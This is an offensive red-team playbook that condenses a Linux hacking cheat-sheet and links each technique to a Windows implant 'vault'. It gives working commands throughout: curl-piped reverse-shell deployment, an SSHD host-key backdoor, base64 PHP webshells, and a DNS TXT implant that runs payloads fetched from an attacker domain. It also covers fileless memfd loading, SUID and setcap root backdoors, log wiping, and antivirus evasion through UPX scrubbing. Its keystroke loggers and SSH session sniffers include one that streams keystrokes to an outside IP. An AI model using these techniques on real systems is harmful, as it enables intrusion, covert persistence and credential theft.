---
id: RTO-linux-backdoors-recon
name: Linux Backdoors, Recon & Session Sniffing (THC)
source: Red Team Ops / THC Tips-Tricks-Hacks-Cheat-Sheet
category: c2-infrastructure
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T-017, T-018, T-019, T-020, T-021, T-022, T-023]
tags: [linux, backdoor, persistence, c2, fileless, memfd, socks, sshd, webshell, dns-tunnel, eBPF, dtrace, strace, sniffing, hijacking, recon, opsec, crypto, anti-forensics]
---

# Linux Backdoors, Recon & Session Sniffing — Training Reference

## TL;DR
THC operator cheat-sheet covering Linux/Unix backdoor deployment, host recon, shell-level OPSEC, cryptography, and credential/session sniffing. While the vault is Windows-centric, this material provides cross-platform tradecraft that complements T-017 (persistence), T-019 (dead-drop C2), T-021 (crypto/obfuscation), T-022 (networking/SOCKS), and T-023 (keylogger/credential harvest). Treat this as the Unix counterpart to several Windows-only vault techniques.

## Key Concepts

1. **Backdoor Deployment Channels**
   - THC prefers deployment via `curl|bash` / `wget|bash` one-liners using gsocket.io, sshx.io, or self-hosted deployment servers (`/ys` endpoint emits a `results.log` of compromised hosts).
   - Cross-ref **T-019 Edo Dead Drop**: vault's autonomous C2 channels (Google Translate, blockchain, steganography) are conceptually equivalent to THC's reverse DNS TXT-tunnel — different medium, same idea of bypassing egress filtering.

2. **SSH Host-Key Backdoor (`AuthorizedKeysFile` trick)**
   - Add `/etc/ssh/ssh_host_ed25519_key.pub` to the `AuthorizedKeysFile` directive in `sshd_config.d/*.conf`. SSHD will then authenticate any user presenting the corresponding private host key — no `authorized_keys`, no PAM, no new files in `$HOME`. Survives `apt update`.
   - Cross-ref **T-017 Five-Layer Persistence**: vault's persistence suite is Windows-only (COM hijack, NTFS EA, schtask, TLS callback, PhantomPersist). This SSHD trick is the Unix equivalent of a low-noise persistence layer — no telemetry because it relies on built-in config directive rather than a binary/installer.

3. **SOCKS Pivot via Global Socket Relay Network**
   - `gs-netcat -l -S` on compromised host advertises a SOCKS exit on the host's private LAN; operator connects with `gs-netcat -p 1080` then `socat - "SOCKS4a:127.1:route.local:22"`. No relay server needed.
   - Cross-ref **T-022 Network Suite / Kamui**: vault's SOCKS5 implementation is the same pattern (implant exposes SOCKS listener, operator tunnels through). THC's gsocket uses the Global Socket Relay Network for NAT-traversal where Kamui would use the C2 channel itself.

4. **Reverse DNS TXT-Tunnel Implant (PHP / Bash / Perl / Python)**
   - Implant is a "bootloader" that fetches a base64-encoded payload from a `TXT` record of an attacker-controlled domain, then `eval`s/executes it. Limited to ~2048 chars per TXT record (sometimes 65535). Larger payloads require a `while`-loop bootloader that reassembles chunks.
   - Cross-ref **T-019 Edo Dead Drop**: vault uses Ethereum transactions and Google Translate as dead-drop channels — DNS TXT is the same pattern, just a different carrier. Vault's blockchain approach is significantly stealthier (no DNS logging) but slower.

5. **Self-Extracting Implant (`mkegg.sh`)**
   - Generates a self-extracting shell-script that bundles arbitrary files/directories, extracts at runtime, and executes a nominated entry point. Demo bundles a gsocket deploy script + webhook callback.
   - Cross-ref **T-022 Architecture / `dark_crystal` runner**: vault's `runner.rs` multi-phase loader (phases 0–6+) is the Windows/PE equivalent of `mkegg.sh`. The "rename to `update-for-fools.txt` and host on Signal's GitHub" trick maps to vault's `winhttp_dl.rs` staged download pattern.

6. **Fileless Execution via `memfd_create` (`memexec` Perl one-liner)**
   - Tries syscall numbers 319, 279, 385, 4314, 4354 in order (memfd_create variants across architectures), `open($o, ">&=".$f)`, `print $o (<STDIN>)`, `exec {"/proc/$$/fd/$f"}`. No disk touch, survives `noexec` mounts.
   - Cross-ref **T-007 Process Injection / Mapping Inject & T-013 Remaining (PE Loader)**: vault's mapping injection uses `NtMapViewOfSection` for similar goals on Windows. The Perl memfd trick is the canonical Linux equivalent.

7. **Host Recon Tradecraft**
   - `whatserver.sh` (host enumeration), `awk_netstat.sh` (port enumeration without netstat/ss/lsof), `bench.sh` (CPU/IO benchmarking), `find / -xdev -type f -perm /6000` (SUID/SGID hunt), `wfind` (writable-dir BFS), `noseyparker`/`trufflehog` (secret scanning), `grep -HEronasi '.{,16}password.{,64}' .` (password hunt), `find_subdomains` (regex extraction from arbitrary files).
   - Cross-ref **T-023 Byakugan**: vault's `byakugan.rs` performs ARP/TCP/AD recon on Windows. THC's `whatserver.sh` is the Unix equivalent first-stage host profile.

8. **Shell OPSEC (Anti-Forensics)**
   - `touch -r /etc/shadow /etc/passwd` (restore mtime to a sibling), `>/var/log/auth.log` (truncate logs without daemon restart), `xlog <regex> <file>` (sed-strip specific lines like your SSH_CLIENT IP), file-hiding via `ls -I` alias, `mkdir '...'` or `mkdir $'\t'` (non-printable dirs), `mount -o bind,ro` for read-only file substitution (effectively a Unix "module stomping").
   - Cross-ref **T-020 Anti-Analysis Suite / Self-Delete**: vault's `self_delete.rs` uses ADS rename on Windows; THC's `/dev/shm`-only deployment achieves the same "NO LOGZ == NO CRIME" outcome by never touching disk.
   - Cross-ref **T-009/T-016 Module Stomping**: `mount -o bind,ro /boot/backdoor.cgi /var/www/cgi/blah.cgi` is the Unix analog — substitute one file's content for another while the original inode appears unmodified.

9. **Payload Obfuscation (UPX cleansing)**
   - `upx -qqq /bin/id -o mybin` then two Perl one-liners zero out the `UPX!` magic and the second `\x7fELF` header to defeat `upx -d` unpacking and AV signatures. Additional scrubbing of `$Info:` / `$Id:` / `PROT_EXEC|PROT_WRI` strings.
   - Cross-ref **T-021 Crypto & Obfuscation / T-020 IAT Camouflage**: vault's compile-time string obfuscation proc macro and IAT camouflage (3 profiles) are the Windows analog. UPX-cleansing is a post-build patching step where the vault favors compile-time obfuscation.

10. **Crypto Toolkit (Linux)**
    - `openssl rand -base64 24` for passwords; `cryptsetup luksFormat` for transportable encrypted filesystems; `encfs --standard` for stacked-encrypted dirs; `openssl enc -aes-256-cbc -pbkdf2 -k $PASS` for file-level encryption.
    - Cross-ref **T-021 Crypto & Obfuscation**: vault's `crypto.rs` uses AES-256-GCM + zstd pipeline — strictly superior to THC's `aes-256-cbc` (no auth, no compression). 

11. **Session/SSH Sniffing (5 methods)**
    - (i) `script -fqaec ... -I ~/.config/.pty/.@pty-unix.$$` injected into `~/.bashrc` — logs keystrokes to a hidden file, masquerades as `sshd: pts/0` via `exec -a`. Paired with `zapper` (THC's `argv`-hider).
    - (ii) FreeBSD/Solaris DTrace `syscall::write:entry` probe on `sshd` execname.
    - (iii) Linux eBPF via `bpftrace` and THC's `ptysnoop.bt` script (hook 120k+ kernel functions).
    - (iv) `strace -e trace=read|write -p <PID>` filtered through `gawk` to strip escape sequences and reconstruct keystrokes; works on running sessions if `yama/ptrace_scope=0`.
    - (v) Wrapper-script attack — drop `~/.local/bin/ssh` that calls `strace -e trace=read -o '! ssh-log $$' /usr/bin/ssh "$@"`; logs land in `~/.local/logs/`. Bypasses `ptrace_scope=1`.
    - (vi) `ssh-it` automated wrapper installer (THC tool).
    - (vii) `reptyr -T <SSH PID>` for live session takeover.
    - Cross-ref **T-023 Keylogger / Credential Harvest**: vault's `keylogger.rs` uses Win32 hooks; THC's `script`+`exec -a` is the Unix analog. Both produce the same artifact class — a per-keystroke log masquerading as a system process.

## Operational Techniques

### gs-netcat Deployment (gsocket.io)

- **What**: One-liner reverse shell + SOCKS pivot deployment using THC's Global Socket Relay Network.
- **When to use**: Initial access on a fresh Linux host with outbound HTTPS; need persistent remote access without burning a custom C2 channel.
- **How**:
  1. Pipe deploy script into bash: `bash -c "$(curl -fsSLk https://gsocket.io/y)"` or `wget` variant.
  2. For self-hosted deploy with logging: `LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/ys)"` (note `/ys`).
  3. To pivot into the host's LAN: `gs-netcat -l -S` on host, then `gs-netcat -p 1080` on operator workstation.
  4. Tunnel any tool through the SOCKS exit: `socat - "SOCKS4a:127.1:route.local:22"`.
- **Vault link**: **T-022 Network Suite / Kamui (SOCKS5)** — Kamui is the Windows-side equivalent embedded in the C2 client. Use gsocket when target is Linux and you don't want to stage the full dark_crystal client; switch to Kamui once the client_rust implant is established for tighter C2 integration.
- **Tool/code**: `gsocket.io/deploy`, `gs-netcat -l -S`, `gs-netcat -p 1080`, `socat - "SOCKS4a:127.1:<target>:<port>"`.
- **OPSEC**: gsocket traffic is TLS-encrypted but pattern-recognizable by SNI; relay network IPs are public and listed in threat intel feeds. Mitigate by self-hosting the deploy server (`/ys`).

### sshx.io Encrypted Reverse Shell

- **What**: Browser-accessible encrypted reverse shell dropped straight to memory.
- **When to use**: Need an interactive shell from operator's browser without SSH key handling; want a UI-driven shell over a hostile network.
- **How**:
  1. Fetch tarball: `curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz | tar xfOz - sshx`.
  2. Inline-execute via Perl memfd pattern (one-liner in source) OR `> .s && chmod 755 .s && (PATH=.:$PATH .s -q >.u 2>/dev/null &)` then poll for the session URL.
- **Vault link**: No direct vault equivalent — vault's transport layer (`tcp_transport.rs`, `http_poll_transport.rs`) is bespoke. sshx is a faster-to-deploy alternative for engagements where the full client isn't yet staged.
- **Tool/code**: `sshx.io`, S3 tarball URL above.
- **OPSEC**: Connection goes to `sshx.io` infrastructure (third-party). Fine for one-shots; for long-dwell engagements, replace with vault's HTTP-poll transport.

### SSHD AuthorizedKeysFile Backdoor

- **What**: Single-line SSHD config edit that allows authentication with the host's ed25519 host key.
- **When to use**: Long-term persistence on a Linux bastion/jump host where you already have root; want SSH access that survives `apt update`, reboots, and account password rotations.
- **How**:
  1. As root, locate the SSHD include dir: `D=/etc/ssh/sshd_config.d`; pick the first existing `.conf` or fall back to `50-cloud-init.conf`, else fall back to `/etc/ssh/sshd_config`.
  2. Append: `AuthorizedKeysFile  .ssh/authorized_keys .ssh/authorized_keys2 /etc/ssh/ssh_host_ed25519_key.pub`.
  3. `touch -r /etc/ssh/ssh_host_ed25519_key <modified_config>` to match mtimes.
  4. Optionally fix ctime via `hackshell` `ctime` command.
  5. `systemctl restart ssh`.
  6. Exfiltrate `/etc/ssh/ssh_host_ed25519_key` (the private key) — use it for SSH to any user account.
- **Vault link**: **T-017 Five-Layer Persistence** — this is the SSHD analogue to vault's COM hijack persistence layer (both rely on a built-in config directive rather than installing a new artifact). Unlike vault's `schtask`/`TLS callback` layers, the SSHD trick produces zero new files on disk in `$HOME`.
- **Tool/code**: snippet `backdoor_sshd()` function from source.
- **OPSEC**: Survives account lockouts and `authorized_keys` audits. Detection requires diff'ing `sshd_config.d/*.conf` against a golden baseline or grepping for `AuthorizedKeysFile` with multiple paths. Mitigate by adding a sentinel config in `sshd_config.d/00-baseline.conf` and shipping it to a SIEM.

### PHP Webshell (Base64 + Multi-Payload)

- **What**: One-line PHP implant dropped at the top of any `.php` file; supports both `system()` command exec and `eval()` PHP-code exec.
- **When to use**: Web-app RCE that needs persistent command channel; AV scanning `.php` files for `system(`/`eval(` strings.
- **How**:
  1. Prepend to any PHP file: `<?php $i=base64_decode("aWYoaXNzZXQoJF9QT1NUWzBdKSl7c3lzdGVtKCRfUE9TVFswXSk7ZGllO30K");eval($i);?>` (base64 of `if(isset($_POST[0])){system($_POST[0]);die;}`).
  2. For dual-mode (cmd+PHP) with comment-camouflage: drop the multi-line `<?PHP /*<random b64>*/if(isset($_POST[0])){eval($_POST[1]?:"");system($_POST[0]);die;}/*<random b64>*/?>` variant.
  3. Trigger via curl: `curl http://127.0.0.1:8080/x.php -d0='id'` for command, `-d1='echo file_get_contents("/etc/hosts");'` for PHP code.
- **Vault link**: **T-021 Shellcode Encoding (IPv4/IPv6/MAC/UUID/words)** — same principle (encode payload to evade signature matching). Base64 in PHP is the equivalent of vault's UUID encoding for shellcode.
- **Tool/code**: See source for exact base64 strings and the comment-camouflage blob.
- **OPSEC**: Base64 is trivially detected by `grep -F system(` over the decoded form. Detection: web-app WAF rules for `eval(`, `system(`, large `$_POST` payloads. Mitigate by chunking the payload across multiple `$_POST` fields.

### Reverse DNS TXT-Tunnel Backdoor

- **What**: Implant that fetches a base64-encoded payload from a DNS TXT record and executes it; supports PHP, Bash, Perl, Python variants.
- **When to use**: Target has no direct outbound HTTP/TCP egress but DNS is open; need a low-bandwidth command channel that survives long-dwell.
- **How** (Bash variant):
  1. Generate payload: `echo -n '@system("{ id; date;}>/tmp/.b00m 2>/dev/null");' | base64 -w0`.
  2. Publish base64 string as TXT record on attacker-controlled domain (e.g. `b00m.team-teso.net`).
  3. Implant on target: `bash -c 'exec bash -c "{ $(dig +short b00m.team-teso.net TXT|tr -d \"|base64 -d);}"'&>/dev/null` — embed in `~/.bashrc`/cron/udev/`ExecStartPre=`.
  4. For persistence: generate a long-running daemon via the `D=b00m2.team-teso.net` snippet — masquerades as `sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups`, polls every 3600s, exits early if marker file `/dev/shm/.cache${UID}` exists.
  5. PHP variant: `<?PHP eval(base64_decode(dns_get_record("b00m.team-teso.net", DNS_TXT)[0]['txt'])); ?>`.
  6. Perl variant uses `Net::DNS::Resolver`; Python variant uses `dns.resolver.resolve(...)`.
- **Vault link**: **T-019 Edo Dead Drop** — vault's blockchain/Google Translate dead drops are the conceptual siblings. DNS TXT is easier to deploy (no contract deployment cost) but more heavily logged (PassiveDNS, Zebra DNS probes). Use Edo Dead Drop when DNS is being surveilled; use DNS TXT when blockchain RPC egress is blocked.
- **Tool/code**: All four language templates in source; helper script `pydnsbackdoorgen()` for Python.
- **OPSEC**: TXT-payload is logged by every recursive resolver and PassiveDNS feed on the path. Mitigate by using short-TTL records and rotating subdomains per checkin (e.g. `<unix-time>.<random>.domain.tld`).

### Local Root Backdoor (ld-linux setcap + b00m shell)

- **What**: Two local-root escalation backdoors that survive reboots.
- **When to use**: Have non-root access, want a permanent root-channel for the engagement.
- **How**:
  - **Variant 1 (setcap on ld-linux)**: As root, `setcap cap_setuid,cap_setgid+ep /lib64/ld-*.so.*`. As any user thereafter: `/lib64/ld-linux-x86-64.so.2 /usr/bin/python3 -c 'import os;os.setuid(0);os.setgid(0);os.execlp("bash", "kdaemon")'`.
  - **Variant 2 (suid b00m shell)**: `cp /bin/sh /var/tmp/.b00m; chmod 6775 /var/tmp/.b00m`. Trigger: `exec /var/tmp/.b00m -p -c 'exec python -c "import os;os.setuid(0);os.execlp(\"bash\", \"kdaemon\")"'`.
- **Vault link**: No direct vault equivalent — vault is Windows-only for privilege escalation (T-017 UAC bypass via `slui.exe` registry, `uac_cmstp.rs` via CMSTP). The setcap trick is the Linux analog of a UAC-bypass persistence layer.
- **Tool/code**: See source for exact `setcap` invocation and `b00m shell` heredoc.
- **OPSEC**: `setcap` on `ld-linux` is detectable via `getcap -r /` audits. SUID shell in `/var/tmp` is detectable via `find / -xdev -type f -perm /6000 -ls`. Mitigate by placing the b00m shell in a non-standard writable+executable path with sticky permissions.

### Self-Extracting Implant (`mkegg.sh`)

- **What**: Bundles files+directories into a single shell-script that extracts at runtime and executes a nominated entry-point.
- **When to use**: Need to deploy multiple files (e.g. gsocket + custom scripts) onto a target via a single `curl|bash` pipeline; the bundle should look innocuous.
- **How**:
  1. `./mkegg.sh egg.sh foo warez warez/run.sh` — packs `foo` + `warez/` into `egg.sh`, executes `warez/run.sh` on extraction.
  2. For real deployments: `./mkegg.sh egg.sh deploy-all.sh '(GS_WEBHOOK_KEY=<uuid> deploy-all.sh 2>/dev/null >/dev/null &)'`.
  3. OPSEC trick: rename `egg.sh` → `update-for-fools.txt`, host on a legitimate-looking GitHub releases section (e.g. `signalapp/Signal-Desktop/files/15037868/update-for-fools.txt`).
  4. Victim: `curl -fL https://github.com/<...>/update-for-fools.txt | bash`.
- **Vault link**: **T-022 Architecture / `dark_crystal` runner + `transport.rs`** — vault's multi-phase runner is the Windows equivalent (embed payload or fetch remote, stage through phases 0–6+). `winhttp_dl.rs` is the Windows analog of the GitHub-releases fetch. The "rename to look like an official Signal update" trick is tradecraft worth adopting in vault's transport module.
- **Tool/code**: `mkegg.sh` from THC repo.
- **OPSEC**: Hosting on GitHub leverages Microsoft's CDN ranges — IP allow-listing on target egress frequently whitelists GitHub. The webhook callback (`GS_WEBHOOK_KEY`) is a clean C2 check-in pattern.

### `memexec` — Fileless ELF Execution via memfd_create

- **What**: Perl one-liner that allocates a memfd, writes STDIN to it, and execs from `/proc/$$/fd/$f` — never touches disk, bypasses `noexec` mounts.
- **When to use**: Target has `noexec` on `/tmp`/`/dev/shm`; you have a single-shot RCE (e.g. PHP eval) and need to execute an ELF.
- **How**:
  1. Long form (with file arg fallback): see `memexec()` function in source.
  2. Short form (STDIN only): `memexec(){ perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255' -- "$@";}`.
  3. Deploy gsocket filelessly: `GS_ARGS="-ilqD -s SecretChangeMe31337" memexec <(curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m))`.
  4. Pipe via SSH for remote-into-remote fileless: `curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | ssh root@foobar "exec perl '$MX' -- -ilqD -s SecretChangeMe31337"`.
  5. Single-shot PHP-RCE variant: pipe `curl` directly into the Perl one-liner.
- **Vault link**: **T-007 Process Injection (Mapping Inject) + T-013 Remaining (PE Loader)** — vault's mapping injection (`mapping_inject.rs`) and reflective PE loader (`pe_loader.rs`) are the Windows analogs. On Linux engagements, memfd_create is strictly simpler than any Windows equivalent — no `NtMapViewOfSection` complexity.
- **Tool/code**: Perl snippet above; syscall constants 319/279/385/4314/4354 are the architecture-agnostic memfd_create syscall numbers.
- **OPSEC**: `memfd_create` allocations are visible via `/proc/<pid>/maps` as `/memfd:...` entries — detectable by `grep memfd /proc/*/maps`. Mitigate by renaming via `prctl(PR_SET_VMA)` (Linux 5.17+) but Perl one-liner doesn't do this — vault's `pe_loader.rs` should consider VMA name spoofing for parity.

### Host Recon Toolkit

- **What**: Drop-in shell functions for host enumeration when standard tools are missing.
- **When to use**: First landing on a target; need a host profile without deploying heavy recon frameworks.
- **How**:
  - Full inventory: `bash -c "$(curl -fsSL https://thc.org/ws)"` or the GitHub-raw equivalent.
  - Netstat replacement: `curl -fsSL https://raw.githubusercontent.com/hackerschoice/.../awk_netstat.sh | bash`.
  - Speed check (CPU/IO fingerprint — useful for VM detection): `curl -fsSL https://bench.sh | bash` or `yabs.sh`.
  - SUID/SGID hunt: `find / -xdev -type f -perm /6000 -ls 2>/dev/null`.
  - Writable-dir BFS (the `wfind` function in source).
  - Secret scanning: `noseyparker` (static binary on THC's `binary/raw/main/tools/` path) + `trufflehog`; for history files use `PassDetective`; for Chrome on Windows use `Chrome-App-Bound-Encryption-Decryption`.
  - Quick password grep: `grep -HEronasi '.{,16}password.{,64}' .`.
  - SSH/TLS key grep: `grep -r -F -- " PRIVATE KEY-----" .`.
  - Subdomain/email extraction from arbitrary files: `find_subdomains <apex> <file>` (uses `rg` if available).
- **Vault link**: **T-023 Byakugan** — vault's recon module does ARP/TCP/AD enum on Windows. THC's toolkit is broader-spectrum Unix recon. Cross-pollinate by porting `find_subdomains` regex extractor into byakugan's file-scanning phase.
- **Tool/code**: All functions/snippets in source.
- **OPSEC**: `curl|bash` from `thc.org`/`bench.sh` is visible in shell history and HTTP logs — pipe through `memexec` or stage locally if you can't risk it.

### Anti-Forensics Shell Hacks

- **What**: mtime/ctime restoration, log truncation, file hiding, immutable-file substitution.
- **When to use**: Any time you touch `/etc/passwd`, log files, or staged payloads — restore original mtimes; hide long-dwell artifacts in non-printable directory names.
- **How**:
  - Restore mtime: `touch -r /etc/shadow /etc/passwd`.
  - Restore ctime+birth-time: use `hackshell`'s `ctime` command (requires FUSE module).
  - Truncate log without daemon restart: `> /var/log/auth.log` (or `cat /dev/null > /var/log/auth.log` on old shells).
  - Strip lines from log: `xlog '1\.2\.3\.4' /var/log/auth.log` (or `${SSH_CLIENT%% *}` to strip your own IP).
  - Hide directory from `ls`: `alias ls='ls -I system-dev'` in `~/.profile`/`/etc/profile`.
  - Non-printable directory: `mkdir $'\t' && cd $'\t'` or `mkdir '...'`.
  - Bind-mount immutable substitution: `touch /var/www/cgi/blah.cgi && mount -o bind,ro /boot/backdoor.cgi /var/www/cgi/blah.cgi` — original inode looks untouched, mount persists until reboot.
  - Volatile-only working dir: `/dev/shm` — no disk writes, no forensic trace post-reboot.
- **Vault link**:
  - **T-020 Anti-Analysis Suite / Self-Delete** — vault's `self_delete.rs` uses Windows ADS rename. `mount -o bind,ro` is the Linux equivalent of file-content substitution that survives integrity scans of the original inode.
  - **T-016 Module Stomping** — same idea, different platform.
- **Tool/code**: All snippets inline in source.
- **OPSEC**: `mount -o bind,ro` survives `find -newer` but not `findmnt`/`/proc/mounts` — wrap detection in `lsblk`/`mount` audit script if defender.

### UPX Obfuscation + Header Cleansing

- **What**: UPX-pack a binary then zero out the `UPX!` magic, the secondary ELF header, and known signature strings (`$Info:`, `$Id:`, `PROT_EXEC|PROT_WRITE`) to defeat `upx -d` and AV signatures.
- **When to use**: Need to ship a Linux ELF dropper past AV that recognises UPX-packed binaries.
- **How**:
  1. Pack: `upx -qqq /bin/id -o mybin`.
  2. Nuke UPX magic: `perl -i -0777 -pe 's/^(.{64})(.{0,256})UPX!.{4}/$1$2\0\0\0\0\0\0\0\0/s' mybin`.
  3. Nuke 2nd ELF header: `perl -i -0777 -pe 's/^(.{64})(.{0,256})\x7fELF/$1$2\0\0\0\0/s' mybin`.
  4. Optional deep scrub: see source for the chained `perl -e` pipeline that zeroes `$Info:`, `$Id:`, `PROT_EXEC|PROT_WRITE` strings and `UPX!` globally.
  5. Verify: `upx -d mybin` should fail with `not packed by UPX`.
  6. Optional extra: encrypt with `bincrypter` from THC.
- **Vault link**: **T-021 Crypto & Obfuscation** + **T-020 IAT Camouflage** — vault's approach is compile-time obfuscation (proc macro for strings) plus IAT camouflage profiles. UPX cleansing is a post-build patching step; vault avoids this by building the dropper from source with obfuscation baked in. Operators who must use a pre-built binary should adopt the UPX-cleanse pipeline.
- **Tool/code**: `upx`, the two primary Perl one-liners, the optional deep-scrub pipeline.
- **OPSEC**: Even with `UPX!` zeroed, entropy analysis of the packed section still flags the binary. Combine with `bincrypter` or vault's AES-GCM pipeline for layered defense.

### Crypto Toolkit

- **What**: Quick recipes for password generation, transportable encrypted filesystems, and file-level encryption.
- **When to use**: Exfiltrating 0-days/logs; carrying engagement artifacts across borders; generating throwaway credentials.
- **How**:
  - Password: `openssl rand -base64 24` OR `head -c 32 < /dev/urandom | xxd -p -c 32` OR `head -c 32 < /dev/urandom | base64 | tr -dc '[:alnum:]' | head -c 16`.
  - LUKS filesystem: `dd if=/dev/urandom of=/tmp/crypted bs=1M count=256 iflag=fullblock && cryptsetup luksFormat /tmp/crypted && cryptsetup open /tmp/crypted sec && mkfs -t ext3 /dev/mapper/sec`. Mount: `cryptsetup open /tmp/crypted sec && mount -o nofail,noatime /dev/mapper/sec /mnt/sec`. Unmount: `umount /mnt/sec && cryptsetup close sec`.
  - EncFS: `mkdir .raw .sec && encfs --standard "${PWD}/.raw" "${PWD}/.sec"`; unmount with `fusermount -u .sec`.
  - File-level: `openssl enc -aes-256-cbc -pbkdf2 -k $PASS < input.txt > input.txt.enc` (decrypt with `-d`).
- **Vault link**: **T-021 Crypto & Obfuscation (`crypto.rs`)** — vault uses AES-256-GCM (authenticated) + zstd compression, which is strictly superior to THC's `aes-256-cbc` (unauthenticated, no compression). Always prefer the vault's crypto crate when both options are available on a target. LUKS has no vault equivalent (vault doesn't deal with filesystem-level encryption).
- **Tool/code**: `openssl`, `cryptsetup`, `encfs`, `fusermount`, `/dev/urandom`.
- **OPSEC**: `aes-256-cbc` is vulnerable to padding-oracle attacks if the encrypted artifact is exposed to chosen-ciphertext. Always upgrade to GCM (vault's crate) for engagement artifacts in transit.

### Session Sniffing — `script` Logger in `~/.bashrc`

- **What**: Keystroke logger via `util-linux`'s `script -fqaec -I <logfile>`, masquerading as `sshd: pts/0` via `exec -a`.
- **When to use**: Non-root on a shared host; want to capture a user's sudo/ssh/git credentials without installing a kernel module.
- **How**:
  1. Run the deploy snippet from source: it creates `~/.config/.pty/`, fetches a static `script` binary (util-linux ≥ 2.37) from `pkgforge.dev` if the local one is too old, and fetches `zapper` (THC's argv-hider).
  2. Add the resulting one-liner to `~/.bashrc`:
     `[ -z "$LC_PTY" ] && [ -t 0 ] && [[ "$HISTFILE" != *null* ]] && [ -d ~/.config/.pty ] && { ~/.config/.pty/ini -h && ~/.config/.pty/pty -V; } &>/dev/null && LC_PTY=1 exec ~/.config/.pty/ini -a "sshd: pts/0" ~/.config/.pty/pty -fqaec "exec ${BASH_EXECUTION_STRING:--a -bash '"$(command -v bash)"'}" -I ~/.config/.pty/.@pty-unix.$$`
  3. Logs land in `~/.config/.pty/.@pty-unix.<pid>`.
  4. Operator can disable on their own SSH: `ssh -o "SetEnv LC_PTY=1"`.
  5. Optional: pipe output to `/dev/tcp/3.13.3.7/1524` for real-time exfil.
- **Vault link**: **T-023 Keylogger (`keylogger.rs`)** — vault's keylogger uses `WH_KEYBOARD_LL` hooks; THC's `script`+`exec -a` masquerade is the Unix analog. Both produce the same artifact class. The `exec -a` argv-spoof is functionally identical to vault's `arg_spoof.rs` (T-016).
- **Tool/code**: `script` from util-linux ≥ 2.37 (static binary fallback from `bin.pkgforge.dev`), `zapper` from THC GitHub releases.
- **OPSEC**: `script` writes to a regular file readable by the user — discoverable via `lsof -p <pid>` on the bash process. The `LC_PTY=1` bypass is a giveaway if defenders know the trick. Mitigate by rotating the env var name per-engagement.

### Session Sniffing — DTrace (FreeBSD/Solaris)

- **What**: Kernel-probe-based sniffing of all `sshd` write() calls on FreeBSD/Solaris/pfSense.
- **When to use**: Target is pfSense or Solaris where eBPF isn't available; need to capture SSH sessions system-wide.
- **How**:
  1. Save the D script to file `d` on target:
     ```
     #pragma D option quiet
     inline string NAME = "sshd";
     syscall::write:entry
     /(arg0 >= 5) && (arg2 <= 16) && (execname == NAME)/
     { printf("%d: %s\n", pid, stringof(copyin(arg1, arg2))); }
     ```
  2. Start: `(dtrace -sd >/tmp/.log &)`.
- **Vault link**: No vault equivalent — vault is Windows-only and uses ETW/AMSI patching (T-016) for the same "see all keystrokes" goal. DTrace is the BSD analog.
- **Tool/code**: D script above; `dtrace -sd`.
- **OPSEC**: DTrace requires root or `dtrace_kernel` privilege. Detectable via `dtrace -l` listing active probes.

### Session Sniffing — eBPF (Linux)

- **What**: Kernel function hooking via `bpftrace` to sniff all PTY/sshd traffic across 120k+ kernel functions.
- **When to use**: Linux target with kernel ≥ 4.x; need root-equivalent visibility without modifying any user-space process.
- **How**:
  1. Fetch static binary: `curl -o bpftrace -fsSL https://github.com/iovisor/bpftrace/releases/latest/download/bpftrace && chmod 755 bpftrace`.
  2. Fetch probe script: `curl -o ptysnoop.bt -fsSL https://github.com/hackerschoice/bpfhacks/raw/main/ptysnoop.bt`.
  3. Run: `./bpftrace -Bnone ptysnoop.bt`.
  4. Additional scripts at THC's `bpfhacks` repo.
- **Vault link**: **T-016 EDR Evasion Suite (ETW muffling)** — vault patches ETW to *disable* kernel telemetry; THC's bpftrace *enables* kernel telemetry for the attacker. Conceptually opposite goals (vault on Windows is the attacker hiding; THC on Linux is the attacker surveilling). Same underlying pattern: kernel-level tracing APIs.
- **Tool/code**: `bpftrace`, `ptysnoop.bt` from `bpfhacks` repo.
- **OPSEC**: Requires `CAP_BPF`/root. Modern kernels with `kernel.unprivileged_bpf_disabled=1` block non-root usage. Detectable via `/sys/kernel/debug/tracing/instances/`.

### Session Sniffing — strace on SSH/SSHD/bash

- **What**: ptrace-based capture of `read()`/`write()` syscalls on a target process; reconstructs keystrokes via awk filtering.
- **When to use**: Already-rooted box; want to grab a specific user's session in-flight; `yama/ptrace_scope=0` or you have root.
- **How**:
  1. Deploy the `tit()` function (see source).
  2. For outgoing SSH: `tit read $(pidof -s ssh)`.
  3. For bash session: `tit read $(pidof -s bash)`.
  4. For SSHD-side (captures sudo passwords too): `ps -eF | grep -E '(^UID|sshd.*pts)'` to find the right `sshd@pts/N` PID, then `tit write <PID>`.
  5. Trace `write()` from sshd (not read) because sshd writes the input data to bash.
- **Vault link**: **T-023 Keylogger** — vault uses Win32 hooks; strace is the ptrace analog. On Windows the equivalent would be `NtReadFile`/`NtWriteFile` hooking via inline IAT/EAT patches — not in vault but worth porting.
- **Tool/code**: `tit()` function, `strace`, `gawk` filter pipeline.
- **OPSEC**: Fails when `yama/ptrace_scope=1` and you're not parent of the target. Use the wrapper-script variant (next technique) to bypass.

### Session Sniffing — SSH Wrapper Script

- **What**: PATH-hijack drop a fake `ssh` binary that wraps real `ssh` with `strace -e trace=read`.
- **When to use**: `yama/ptrace_scope=1` blocks ptracing already-running processes; you control the user's shell init files.
- **How**:
  1. `echo 'PATH=~/.local/bin:$PATH #0xFD0E' >>~/.profile`.
  2. Create `~/.local/bin/ssh` and `~/.local/bin/ssh-log` per source.
  3. The fake `ssh` runs: `strace -e trace=read -I 1 -o '! ~/.local/bin/ssh-log $$' /usr/bin/ssh "$@"`.
  4. The `ssh-log` helper greps `read(4` lines and reconstructs keystrokes to `~/.local/logs/ssh-log-<pid>-<epoch>.txt`.
  5. Uninstall: `grep -v 0xFD0E ~/.profile >~/.profile-new && mv ~/.profile-new ~/.profile && rm -rf ~/.local/bin/ssh ~/.local/bin/ssh-log ~/.local/logs`.
- **Vault link**: **T-016 Proxy DLL** — vault's proxy DLL is the Windows analog (interpose a malicious DLL with the same exports as a legit one). The PATH-hijack wrapper is the Unix equivalent.
- **Tool/code**: Snippets in source.
